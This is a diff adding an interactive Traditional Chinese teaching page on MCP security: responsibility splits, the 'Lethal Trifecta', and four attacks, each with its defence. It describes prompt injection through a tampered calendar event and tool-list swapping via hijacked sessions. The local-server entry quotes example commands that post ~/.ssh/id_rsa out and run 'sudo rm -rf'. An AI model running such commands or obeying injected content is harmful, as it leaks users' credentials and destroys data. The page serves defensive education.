@@ -1,0 +1,367 @@
+---
+title: MCP 安全模型 — 互動圖解
+summary: 三張互動圖:誰該防誰的責任分工、四個具體攻擊(Confused Deputy、兩種 Session Hijacking、本機淪陷)、Lethal Trifecta——三個能力疊在一起才是真正危險。
+date: 2026-07-02
+tags:
+  - mcp
+  - security
+  - interactive
+layout: none
+render_with_liquid: false
+---
+<!DOCTYPE html>
+<!--
+  INTERACTIVE — MCP 安全模型:三張互動圖解。可長期回看的教學頁(pages/ genre,發布於
+  /mcp/security/),不是 disposable mockup。101 之外的「進階」主題,故意不塞進 101 頁。
+  Derived from(內容真相來源;呈現/措辭允許不同,概念要一致):
+    ../docs/2026-07-02-mcp-security-model.md
+  Last synced: 2026-07-02 — docs 大改時回來更新這頁,並更新這個日期。
+  What it is:
+    圖 A(責任分工)— Server MUST / Client SHOULD 兩欄,點卡片看細節。
+    圖 B(Lethal Trifecta)— 三個圓圈的 Venn 圖(私密資料存取 / 不信任內容 / 對外通訊能力),
+      點單一圓看「只有一個能力還好」,點中間的警示牌看「三個疊在一起才是真正危險」+ 真實示範案例。
+    圖 C(四個具體攻擊)— Confused Deputy、Session Hijack Impersonation、Session Hijack
+      Prompt Injection、本機 server 淪陷,點卡片看攻擊手法 + 防禦法。
+-->
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MCP 安全模型 — 誰該防誰</title>
+<style>
+  :root{
+    --bg:#f7f4ec; --panel:#fffdf8; --ink:#2a211c; --muted:#8a7d6e; --faint:#a99c8a;
+    --line:#e7e0d2; --line-soft:#efe9dd; --accent:#9a6b2e; --green:#0c7a59; --rose:#b04a6a;
+    --blue:#2f6f9e;
+    --shadow:0 1px 2px rgba(42,33,28,.04),0 14px 34px -20px rgba(42,33,28,.30);
+    --mono:'SF Mono',ui-monospace,'JetBrains Mono',Menlo,monospace;
+    --sans:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI','PingFang TC','Microsoft JhengHei',sans-serif;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);background-image:radial-gradient(#ddd9cf 1px,transparent 1px);background-size:26px 26px;
+    color:var(--ink);font:15px/1.65 var(--sans);-webkit-font-smoothing:antialiased}
+  .wrap{max-width:1160px;margin:0 auto;padding:40px 28px 100px}
+  header{margin-bottom:8px}
+  .kicker{font-family:var(--mono);font-size:11.5px;color:var(--accent);letter-spacing:.04em;text-transform:uppercase}
+  h1{font-size:27px;font-weight:680;letter-spacing:-.01em;margin-top:8px}
+  .tagline{color:var(--muted);font-size:14.5px;margin-top:8px;max-width:76ch}
+
+  section{margin-top:52px}
+  .sec-kicker{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:.04em;text-transform:uppercase}
+  .sec-title{font-size:20px;font-weight:680;margin-top:6px}
+  .sec-sub{color:var(--muted);font-size:13.5px;margin-top:6px;max-width:74ch}
+
+  .row{display:flex;align-items:stretch;gap:10px;margin-top:22px;flex-wrap:nowrap}
+  .arrow{display:flex;align-items:center;color:var(--faint);font-size:16px;flex:0 0 auto;padding:0 1px}
+  .node{flex:1;min-width:0;background:var(--panel);border:1px solid var(--line);border-radius:14px;
+    box-shadow:var(--shadow);padding:16px 14px;cursor:pointer;transition:transform .16s ease,border-color .16s ease;
+    text-align:left}
+  .node:hover{transform:translateY(-3px);border-color:var(--accent)}
+  .node.active{border-color:var(--accent);box-shadow:0 0 0 2px rgba(154,107,46,.18),var(--shadow)}
+  .node .idx{font-family:var(--mono);font-size:10.5px;color:var(--faint)}
+  .node h3{font-size:14.5px;font-weight:660;margin-top:5px;line-height:1.3}
+  .node .q{margin-top:7px;font-size:12px;color:var(--muted)}
+
+  .panel{margin-top:20px;background:var(--panel);border:1px solid var(--line);border-radius:14px;
+    box-shadow:var(--shadow);padding:22px 24px;min-height:110px}
+  .panel .ph{font-family:var(--mono);font-size:11px;color:var(--faint);text-transform:uppercase;letter-spacing:.04em}
+  .panel h2{font-size:18px;font-weight:680;margin-top:8px}
+  .panel .meta{margin-top:10px;display:grid;grid-template-columns:auto 1fr;gap:6px 14px;font-size:13.5px}
+  .panel .meta b{color:var(--accent);font-weight:650;white-space:nowrap}
+  .panel .ex{margin-top:12px;padding:11px 14px;background:var(--bg);border-left:3px solid var(--accent);
+    border-radius:0 10px 10px 0;font-size:13.5px}
+  .panel .placeholder{color:var(--muted);font-size:14px}
+
+  .resp-groups{display:flex;gap:22px;margin-top:22px;flex-wrap:wrap}
+  .rgroup{flex:1;min-width:280px}
+  .rgroup .glabel{font-family:var(--mono);font-size:11px;letter-spacing:.03em;padding:4px 10px;
+    border-radius:999px;display:inline-flex;align-items:center;gap:6px}
+  .rgroup.server .glabel{background:rgba(12,122,89,.1);color:var(--green)}
+  .rgroup.client .glabel{background:rgba(47,111,158,.1);color:var(--blue)}
+  .rgroup .chips{display:flex;flex-direction:column;gap:9px;margin-top:12px}
+  .chip{background:var(--panel);border:1px solid var(--line);border-radius:11px;box-shadow:var(--shadow);
+    padding:11px 13px;cursor:pointer;transition:transform .16s ease,border-color .16s ease}
+  .chip:hover{transform:translateY(-2px)}
+  .rgroup.server .chip.active{border-color:var(--green);box-shadow:0 0 0 2px rgba(12,122,89,.16),var(--shadow)}
+  .rgroup.client .chip.active{border-color:var(--blue);box-shadow:0 0 0 2px rgba(47,111,158,.16),var(--shadow)}
+  .chip h4{font-size:13.5px;font-weight:660}
+  .chip .sub{font-size:11.5px;color:var(--muted);margin-top:4px}
+
+  .venn{position:relative;margin-top:26px;background:var(--panel);border:1px solid var(--line);
+    border-radius:14px;box-shadow:var(--shadow);padding:16px}
+  .venn svg{width:100%;height:auto;display:block;max-width:560px;margin:0 auto}
+  .venn-circle{cursor:pointer;transition:opacity .15s ease}
+  .venn-circle:hover,.venn-circle.active{opacity:.85}
+  .venn-badge{position:absolute;left:50%;top:52%;transform:translate(-50%,-50%);cursor:pointer;z-index:3}
+  .venn-badge .pill{display:inline-flex;align-items:center;gap:6px;background:var(--panel);
+    border:1.5px dashed var(--rose);color:var(--rose);border-radius:999px;padding:6px 14px;
+    font-size:12px;font-weight:650;box-shadow:var(--shadow);white-space:nowrap;animation:pulse 2.4s ease-in-out infinite}
+  @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(176,74,106,.25)}50%{box-shadow:0 0 0 8px rgba(176,74,106,.06)}}
+  .venn-badge.active .pill{background:var(--rose);color:#fff}
+
+  .refs{margin-top:20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:14px}
+  .ref-group{background:var(--panel);border:1px solid var(--line);border-radius:14px;box-shadow:var(--shadow);
+    padding:16px 18px}
+  .ref-head{font-family:var(--mono);font-size:11px;color:var(--accent);text-transform:uppercase;
+    letter-spacing:.03em;margin-bottom:10px}
+  .ref-group a{display:block;font-size:12.5px;color:var(--muted);text-decoration:none;padding:5px 0 5px 14px;
+    position:relative;line-height:1.5;border-radius:6px}
+  .ref-group a::before{content:"↗";position:absolute;left:0;color:var(--faint);font-size:11px}
+  .ref-group a:hover{color:var(--accent)}
+  .ref-group a:hover::before{color:var(--accent)}
+
+  footer{margin-top:40px;color:var(--faint);font-size:12px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div class="kicker">Interactive · MCP 安全模型</div>
+    <h1>MCP 安全模型 — 誰該防誰</h1>
+    <p class="tagline">
+      101 之外的進階主題。圖 A 是責任怎麼分兩邊,圖 B 是整篇最重要的一張圖——三個能力疊在一起
+      才是真正的危險,圖 C 是四個官方文件實際列出的具體攻擊。點任何卡片看細節。
+    </p>
+  </header>
+
+  <!-- ============ SECTION A: 責任分工 ============ -->
+  <section>
+    <div class="sec-kicker">圖 A · 誰該防誰</div>
+    <div class="sec-title">責任分兩邊,少了任何一邊都補不回來</div>
+    <p class="sec-sub">
+      Server 負責不要輸出髒東西,Client 負責不要盲目相信輸入的東西——這是官方規格對 Tools
+      寫的安全考量,雙邊各有一份清單。
+    </p>
+
+    <div class="resp-groups">
+      <div class="rgroup server">
+        <span class="glabel">● Server MUST</span>
+        <div class="chips" id="serverResp">
+          <div class="chip" data-key="validate"><h4>驗證所有工具輸入</h4><div class="sub">Validate all tool inputs</div></div>
+          <div class="chip" data-key="access"><h4>實作存取控制</h4><div class="sub">Implement proper access controls</div></div>
+          <div class="chip" data-key="ratelimit"><h4>限流</h4><div class="sub">Rate limit tool invocations</div></div>
+          <div class="chip" data-key="sanitize"><h4>清理輸出</h4><div class="sub">Sanitize tool outputs</div></div>
+        </div>
+      </div>
+      <div class="rgroup client">
+        <span class="glabel">● Client SHOULD</span>
+        <div class="chips" id="clientResp">
+          <div class="chip" data-key="confirm"><h4>敏感操作前要求確認</h4><div class="sub">Prompt for confirmation</div></div>
+          <div class="chip" data-key="display"><h4>執行前顯示輸入內容</h4><div class="sub">Display tool inputs before execution</div></div>
+          <div class="chip" data-key="revalidate"><h4>結果送進 LLM 前再驗一次</h4><div class="sub">Validate tool results before passing to an LLM</div></div>
+          <div class="chip" data-key="audit"><h4>逾時 + 留稽核紀錄</h4><div class="sub">Implement timeouts, maintain logs</div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel" id="panelA">
+      <p class="placeholder">↑ 點上面任一張卡片看細節。</p>
+    </div>
+  </section>
+
+  <!-- ============ SECTION B: Lethal Trifecta ============ -->
+  <section>
+    <div class="sec-kicker">圖 B · 三個能力疊在一起才危險</div>
+    <div class="sec-title">Lethal Trifecta</div>
+    <p class="sec-sub">
+      單獨一個能力都還好。點下面任一個圓,看「只有這一個能力」為什麼還不算危險;點中間那個一直在
+      跳動的警示牌,看三個疊在一起之後,真正的攻擊鏈長什麼樣。
+    </p>
+
+    <div class="venn">
+      <svg viewBox="0 0 500 380">
+        <circle class="venn-circle" data-key="private" cx="200" cy="160" r="115" fill="#2f6f9e" opacity=".22" stroke="#2f6f9e" stroke-width="2"/>
+        <circle class="venn-circle" data-key="untrusted" cx="300" cy="160" r="115" fill="#9a6b2e" opacity=".22" stroke="#9a6b2e" stroke-width="2"/>
+        <circle class="venn-circle" data-key="exfil" cx="250" cy="245" r="115" fill="#0c7a59" opacity=".22" stroke="#0c7a59" stroke-width="2"/>
+        <text x="105" y="105" font-size="13" fill="#2f6f9e" font-weight="650" style="font-family:var(--mono)">私密資料存取</text>
+        <text x="330" y="105" font-size="13" fill="#9a6b2e" font-weight="650" style="font-family:var(--mono)">不信任內容</text>
+        <text x="205" y="345" font-size="13" fill="#0c7a59" font-weight="650" style="font-family:var(--mono)">對外通訊能力</text>
+      </svg>
+      <div class="venn-badge" id="vennBadge">
+        <span class="pill">⚠ 三個疊在一起</span>
+      </div>
+    </div>
+
+    <div class="panel" id="panelB">
+      <p class="placeholder">↑ 點一個圓,或點中間的警示牌。</p>
+    </div>
+  </section>
+
+  <!-- ============ SECTION C: 四個具體攻擊 ============ -->
+  <section>
+    <div class="sec-kicker">圖 C · 官方文件實際列出的攻擊</div>
+    <div class="sec-title">四個具體攻擊,各自的手法跟防禦</div>
+    <p class="sec-sub">
+      不是泛泛而談的「小心 prompt injection」——這四個是官方安全文件裡實際寫出攻擊條件跟防禦法的。
+    </p>
+
+    <div class="row" id="attackRow">
+      <div class="node" data-key="confused">
+        <div class="idx">代理層</div>
+        <h3>Confused Deputy</h3>
+        <div class="q">Proxy 對第三方共用同一個 client_id</div>
+      </div>
+      <div class="arrow">·</div>
+      <div class="node" data-key="impersonation">
+        <div class="idx">Session</div>
+        <h3>Hijack Impersonation</h3>
+        <div class="q">搶到 session id 直接冒充</div>
+      </div>
+      <div class="arrow">·</div>
+      <div class="node" data-key="eventinjection">
+        <div class="idx">Session</div>
+        <h3>Hijack Prompt Injection</h3>
+        <div class="q">搶到 session id,置換工具清單</div>
+      </div>
+      <div class="arrow">·</div>
+      <div class="node" data-key="localcompromise">
+        <div class="idx">本機</div>
+        <h3>Local Server Compromise</h3>
+        <div class="q">stdio 等於用你的權限跑陌生程式</div>
+      </div>
+    </div>
+
+    <div class="panel" id="panelC">
+      <p class="placeholder">↑ 點一個節點看攻擊手法 + 防禦法。</p>
+    </div>
+  </section>
+
+  <!-- ============ REFERENCES ============ -->
+  <section>
+    <div class="sec-kicker">References · 參考資料</div>
+    <div class="sec-title">這一頁的內容查證自哪裡</div>
+    <p class="sec-sub">
+      全部經 context7 於 2026-07-02 抓取查證。Lethal Trifecta 本身是 Simon Willison 提出的通用
+      安全概念,MCP 官方部落格引用它來論證 tool annotation 該怎麼設計——不是 MCP 自己發明的。
+    </p>
+    <div class="refs">
+      <div class="ref-group">
+        <div class="ref-head">MCP 官方安全文件</div>
+        <a href="https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/specification/2025-11-25/index.mdx">specification index — Security and Trust & Safety 整體原則</a>
+        <a href="https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/specification/2025-11-25/server/tools.mdx">tools.mdx — Security Considerations 雙邊責任清單</a>
+        <a href="https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/docs/tutorials/security/security_best_practices.mdx">security_best_practices.mdx — Confused Deputy、Token Passthrough、Session Hijacking、本機淪陷</a>
+        <a href="https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/specification/2025-11-25/basic/authorization.mdx">authorization.mdx — Confused Deputy Problem 正式定義</a>
+        <a href="https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/docs/tutorials/security/authorization.mdx">authorization 教學 — 錯誤訊息不外洩、correlation ID</a>
+        <a href="https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/blog/content/posts/2026-03-16-tool-annotations.md">tool-annotations 部落格 — Lethal Trifecta 官方引用 + 真實示範案例</a>
+        <a href="https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/schema/draft/schema.ts">schema.ts — Tool description 欄位官方註解(只是給模型的 hint)</a>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    互動教學頁 · 內容以 docs/2026-07-02-mcp-security-model.md 為真相來源(經 context7 查證)·
+    最後同步 2026-07-02
+  </footer>
+</div>
+
+<script>
+  const RESP = {
+    validate: { title: '驗證所有工具輸入', tag: 'Server MUST', def: '不能假設輸入乾淨——每個工具呼叫的參數都要驗證型別、範圍、格式,擋掉不合法的輸入。' },
+    access: { title: '實作存取控制', tag: 'Server MUST', def: '誰能呼叫這個工具、能存取哪些資源,要有明確的權限邊界,不能靠「反正只有內部人在用」這種假設。' },
+    ratelimit: { title: '限流', tag: 'Server MUST', def: '對工具呼叫做速率限制,擋掉暴力嘗試或失控的自動化迴圈把 server 打垮。' },
+    sanitize: { title: '清理輸出', tag: 'Server MUST', def: '回給 client 的內容要清過——不要把內部錯誤細節、敏感資訊原封不動吐回去。' },
+    confirm: { title: '敏感操作前要求確認', tag: 'Client SHOULD', def: '刪除、付款、傳送這類有副作用的操作,執行前要跳出來讓使用者按確認,不能靜默執行。' },
+    display: { title: '執行前顯示輸入內容', tag: 'Client SHOULD', def: '讓使用者看到「這個工具即將帶著這些參數被呼叫」,防止在使用者不知情下夾帶資料外洩。' },
+    revalidate: { title: '結果送進 LLM 前再驗一次', tag: 'Client SHOULD', def: '工具回來的結果不能直接無條件塞進下一輪 prompt——這正是擋住「不信任內容」流進模型 context 的最後一道關。' },
+    audit: { title: '逾時 + 留稽核紀錄', tag: 'Client SHOULD', def: '設逾時避免卡死;留下呼叫紀錄,事後才查得出是哪一步出了問題。' }
+  };
+  const panelA = document.getElementById('panelA');
+  const chipsA = document.querySelectorAll('#serverResp .chip, #clientResp .chip');
+  function renderResp(key){
+    const d = RESP[key];
+    chipsA.forEach(n => n.classList.toggle('active', n.dataset.key === key));
+    panelA.innerHTML = `
+      <div class="ph">${d.tag}</div>
+      <h2>${d.title}</h2>
+      <div class="ex">${d.def}</div>
+    `;
+  }
+  chipsA.forEach(n => n.addEventListener('click', () => renderResp(n.dataset.key)));
+
+  const VENN = {
+    private: {
+      title: '私密資料存取', tag: '單獨一個 · 還算安全',
+      def: '一個工具可以讀到你的私密資料(信箱、日曆、檔案系統),但如果它沒辦法把東西送出去、也沒有碰到任何不受信任的內容,單獨這個能力頂多是「它知道很多」,不會主動變成攻擊。',
+      example: '例:一個唯讀的行事曆工具,只給你自己看,沒有對外通訊能力——很難被利用。'
+    },
+    untrusted: {
+      title: '接觸不信任內容', tag: '單獨一個 · 還算安全',
+      def: 'agent 讀到一段可能藏著指令的外部內容(網頁、信件、日曆事件描述),但如果它沒有私密資料可偷、也沒有辦法把結果送出去,這段惡意指令頂多讓它做一些奇怪但無害的事。',
+      example: '例:一個只會把網頁內容整理成摘要顯示給你看的工具,就算網頁裡藏了指令,也偷不到東西、送不出東西。'
+    },
+    exfil: {
+      title: '對外通訊能力', tag: '單獨一個 · 還算安全',
+      def: 'agent 能執行 shell、發 HTTP 請求——但如果它沒有私密資料可偷,也沒被騙(沒接觸不信任內容），這個能力就只是「能做事」,不會自己變成洩漏管道。',
+      example: '例:一個只會呼叫公開天氣 API 的工具,就算能對外發請求,也沒東西可偷。'
+    }
+  };
+  const TRIFECTA = {
+    title: 'Lethal Trifecta', tag: '⚠ 三個同時存在 · 真正危險',
+    def: '私密資料存取 + 接觸不信任內容 + 對外通訊能力,三個同時出現在同一次執行路徑上——LLM 分不出「使用者的指令」跟「藏在內容裡、攻擊者塞進去的指令」,一段惡意內容就能誘騙模型把私密資料讀出來再送出去。',
+    example: '真實示範案例:一則被動過手的 Google 日曆事件描述(藏著指令,= 不信任內容)+ 一個 MCP 行事曆 server(= 私密資料存取)+ 一個本機執行工具(= 對外通訊能力)。三個工具可能來自完全不同、各自都不算惡意的 server——風險是「這次 session 湊齊了什麼」,不是「哪個 server 是壞的」。目前有 SEP 在提案幫工具加 reads_private_data / sees_untrusted_content / can_exfiltrate 這類 metadata,讓 client 能偵測三個是不是同時湊齊,湊齊就擋下來或要求人工核准。'
+  };
+  const panelB = document.getElementById('panelB');
+  const circles = document.querySelectorAll('.venn-circle');
+  const vennBadge = document.getElementById('vennBadge');
+  function renderVenn(key){
+    const d = VENN[key];
+    circles.forEach(c => c.classList.toggle('active', c.dataset.key === key));
+    vennBadge.classList.remove('active');
+    panelB.innerHTML = `
+      <div class="ph">${d.tag}</div>
+      <h2>${d.title}</h2>
+      <div class="ex">${d.def}</div>
+      <div class="ex" style="margin-top:8px;background:var(--line-soft);border-left-color:var(--muted)">${d.example}</div>
+    `;
+  }
+  function renderTrifecta(){
+    circles.forEach(c => c.classList.remove('active'));
+    vennBadge.classList.add('active');
+    panelB.innerHTML = `
+      <div class="ph">${TRIFECTA.tag}</div>
+      <h2>${TRIFECTA.title}</h2>
+      <div class="ex" style="border-left-color:var(--rose)">${TRIFECTA.def}</div>
+      <div class="ex" style="margin-top:8px;background:var(--line-soft);border-left-color:var(--muted)">${TRIFECTA.example}</div>
+    `;
+  }
+  circles.forEach(c => c.addEventListener('click', () => renderVenn(c.dataset.key)));
+  vennBadge.addEventListener('click', renderTrifecta);
+
+  const ATTACK = {
+    confused: {
+      title: 'Confused Deputy Problem', tag: '代理層 · basic/authorization.mdx',
+      attack: 'MCP server 當代理去串接第三方 OAuth 授權伺服器,但對所有動態註冊的 MCP client 都用同一組固定 client_id。第三方授權伺服器第一次授權後會下一個 consent cookie——攻擊者可以利用這個共用的同意狀態,騙到一個從沒被真正授權過的存取權杖。',
+      mitigation: '防禦法:proxy 必須對每一個 client 各自檢查同意(per-client consent),不能因為「這台 proxy 之前被同意過」就直接放行所有掛在它後面的 client。'
+    },
+    impersonation: {
+      title: 'Session Hijack Impersonation', tag: 'Session · security_best_practices.mdx',
+      attack: 'MCP client 認證後拿到一個 session id,攻擊者偷到這個 id 就直接拿去打請求。如果 server 只靠 session id 判斷身分、沒做額外授權檢查,就會把攻擊者當成合法使用者。',
+      mitigation: '防禦法:永遠不能只靠 session id 判斷身分,每個請求都要重新驗證授權;session id 要用安全隨機數產生,還可以跟使用者身分綁定(如 `<user_id>:<session_id>`),偷到 id 也冒充不了。'
+    },
+    eventinjection: {
+      title: 'Session Hijack Prompt Injection', tag: 'Session · security_best_practices.mdx',
+      attack: '攻擊者偷到 session id 後,對另一台 server(Server B)送一個惡意事件。如果 server 支援可續傳串流、又會因為工具呼叫發 SSE 事件(如 notifications/tools/list_changed),攻擊者就能置換掉 client 實際看到的工具清單內容。',
+      mitigation: '防禦法跟 Impersonation 同一套:別只靠 session id、安全隨機 id、id 跟使用者綁定——這條攻擊鏈的起點一樣是「session id 被偷」。'
+    },
+    localcompromise: {
+      title: 'Local Server Compromise', tag: '本機 · security_best_practices.mdx',
+      attack: 'stdio transport 讓 host 直接把 server 當子程序啟動——一個沒篩選過的本機 server,幾乎等於讓陌生程式碼用你的權限跑。可能造成資料外洩、提權,攻擊者還能用指令混淆技巧掩護。',
+      mitigation: '官方文件直接舉了具體範例:`npx malicious-package && curl -X POST -d @~/.ssh/id_rsa ...`(外洩)、`sudo rm -rf /important/system/files`(提權)。防禦法:只裝來源可信的本機 server,執行前看得到它到底要跑什麼指令。'
+    }
+  };
+  const panelC = document.getElementById('panelC');
+  const nodesC = document.querySelectorAll('#attackRow .node');
+  function renderAttack(key){
+    const d = ATTACK[key];
+    nodesC.forEach(n => n.classList.toggle('active', n.dataset.key === key));
+    panelC.innerHTML = `
+      <div class="ph">${d.tag}</div>
+      <h2>${d.title}</h2>
+      <div class="meta"><b>攻擊手法</b><span>${d.attack}</span></div>
+      <div class="ex">${d.mitigation}</div>
+    `;
+  }
+  nodesC.forEach(n => n.addEventListener('click', () => renderAttack(n.dataset.key)));
+</script>
+</body>
+</html>
